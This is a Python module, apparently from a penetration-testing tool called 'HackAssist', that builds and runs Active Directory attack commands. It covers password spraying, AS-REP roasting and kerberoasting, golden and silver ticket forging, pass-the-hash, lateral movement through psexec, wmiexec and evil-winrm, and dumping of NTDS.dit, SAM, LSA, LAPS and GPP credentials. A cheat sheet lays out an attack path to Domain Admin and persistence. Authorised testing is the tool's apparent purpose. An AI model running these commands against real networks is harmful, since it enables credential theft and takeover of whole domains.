#!/usr/bin/env python3
"""HackAssist - Active Directory Pentesting Module."""

from ui import console, show_menu, ask, info, success, warning, error
from executor import run_with_preview


AD_ENUM = {
    'Domain Info (enum4linux)': 'enum4linux -a {target}',
    'Users (rpcclient)': "rpcclient -U '' -N {target} -c 'enumdomusers'",
    'Groups (rpcclient)': "rpcclient -U '' -N {target} -c 'enumdomgroups'",
    'Password Policy': "rpcclient -U '' -N {target} -c 'getdompwinfo'",
    'SMB Shares': 'smbclient -L //{target}/ -N',
    'LDAP Search': 'ldapsearch -x -H ldap://{target} -b "dc=domain,dc=com" -s sub "(objectClass=user)"',
    'Kerberos Users (kerbrute)': 'kerbrute userenum -d {domain} --dc {target} users.txt',
    'BloodHound Collection': 'bloodhound-python -d {domain} -u {user} -p {pass} -ns {target} -c All',
    'CrackMapExec SMB': 'crackmapexec smb {target}',
    'CrackMapExec Users': 'crackmapexec smb {target} -u {user} -p {pass} --users',
}

KERBEROS_ATTACKS = {
    'AS-REP Roasting': 'impacket-GetNPUsers {domain}/ -usersfile users.txt -dc-ip {target} -format hashcat',
    'Kerberoasting': 'impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {target} -request',
    'Silver Ticket': 'impacket-ticketer -nthash {hash} -domain-sid {sid} -domain {domain} -spn {spn} {user}',
    'Golden Ticket': 'impacket-ticketer -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} {user}',
    'Pass-the-Ticket': 'export KRB5CCNAME=ticket.ccache && impacket-psexec {domain}/{user}@{target} -k -no-pass',
}

LATERAL_MOVEMENT = {
    'PSExec': 'impacket-psexec {domain}/{user}:{pass}@{target}',
    'WMIExec': 'impacket-wmiexec {domain}/{user}:{pass}@{target}',
    'SMBExec': 'impacket-smbexec {domain}/{user}:{pass}@{target}',
    'ATExec': 'impacket-atexec {domain}/{user}:{pass}@{target} "command"',
    'Evil-WinRM': 'evil-winrm -i {target} -u {user} -p {pass}',
    'RDP': 'xfreerdp /v:{target} /u:{user} /p:{pass} /cert-ignore',
    'Pass-the-Hash (PTH)': 'impacket-psexec -hashes :{hash} {domain}/{user}@{target}',
    'CrackMapExec Spray': 'crackmapexec smb {target} -u users.txt -p {pass} --continue-on-success',
}

CREDENTIAL_DUMP = {
    'SAM Dump': 'impacket-secretsdump {domain}/{user}:{pass}@{target}',
    'NTDS.dit': 'impacket-secretsdump -just-dc {domain}/{user}:{pass}@{target}',
    'LSA Secrets': 'impacket-secretsdump -just-dc-user Administrator {domain}/{user}:{pass}@{target}',
    'LAPS Passwords': 'crackmapexec ldap {target} -u {user} -p {pass} --laps',
    'GPP Passwords': 'crackmapexec smb {target} -u {user} -p {pass} -M gpp_password',
}


def _fill_placeholders(cmd, session):
    """Replace placeholders with user input."""
    target = session['target'] if session else ask("Target IP/hostname")
    cmd = cmd.replace('{target}', target)

    if '{domain}' in cmd:
        cmd = cmd.replace('{domain}', ask("Domain name"))
    if '{user}' in cmd:
        cmd = cmd.replace('{user}', ask("Username"))
    if '{pass}' in cmd:
        cmd = cmd.replace('{pass}', ask("Password"))
    if '{hash}' in cmd:
        cmd = cmd.replace('{hash}', ask("NTLM Hash"))
    if '{sid}' in cmd:
        cmd = cmd.replace('{sid}', ask("Domain SID"))
    if '{spn}' in cmd:
        cmd = cmd.replace('{spn}', ask("Service SPN"))
    if '{krbtgt_hash}' in cmd:
        cmd = cmd.replace('{krbtgt_hash}', ask("KRBTGT NTLM Hash"))
    return cmd


def _run_category(title, commands, session):
    console.print(f"\n[bold cyan]{title}[/bold cyan]\n")
    options = [(str(i), name) for i, name in enumerate(commands.keys(), 1)]
    options.append(("0", "Back"))
    choice = show_menu(options)
    if choice == "0":
        return
    try:
        idx = int(choice) - 1
        name = list(commands.keys())[idx]
        cmd = _fill_placeholders(commands[name], session)
        run_with_preview(cmd, session=session, stage="ad")
    except (ValueError, IndexError):
        pass


def _ad_cheatsheet():
    from rich.panel import Panel
    cheat = """
[bold cyan]AD Attack Flow:[/bold cyan]
1. Enumerate domain (enum4linux, rpcclient, ldapsearch)
2. Collect BloodHound data → find attack paths
3. AS-REP Roast / Kerberoast → crack hashes
4. Spray credentials → find valid creds
5. Lateral movement (PSExec/WMIExec/Evil-WinRM)
6. Dump credentials (secretsdump/mimikatz)
7. Escalate to Domain Admin
8. DCSync / Golden Ticket for persistence

[bold cyan]Key Tools:[/bold cyan]
  Impacket, BloodHound, CrackMapExec, Rubeus
  Mimikatz, Evil-WinRM, Kerbrute, Responder

[bold cyan]Hashcat Modes:[/bold cyan]
  NTLM:       -m 1000
  NetNTLMv2:  -m 5600
  Kerberos 5: -m 13100 (TGS-REP)
  AS-REP:     -m 18200
"""
    console.print(Panel(cheat, title="AD Pentesting Cheatsheet", border_style="green"))


def run(session):
    """Active Directory module entry point."""
    while True:
        console.print("\n[bold green]ACTIVE DIRECTORY PENTESTING[/bold green]\n")
        options = [
            ("1", "AD Enumeration"),
            ("2", "Kerberos Attacks"),
            ("3", "Lateral Movement"),
            ("4", "Credential Dumping"),
            ("5", "AD Cheatsheet"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            break
        elif choice == "1":
            _run_category("AD Enumeration", AD_ENUM, session)
        elif choice == "2":
            _run_category("Kerberos Attacks", KERBEROS_ATTACKS, session)
        elif choice == "3":
            _run_category("Lateral Movement", LATERAL_MOVEMENT, session)
        elif choice == "4":
            _run_category("Credential Dumping", CREDENTIAL_DUMP, session)
        elif choice == "5":
            _ad_cheatsheet()
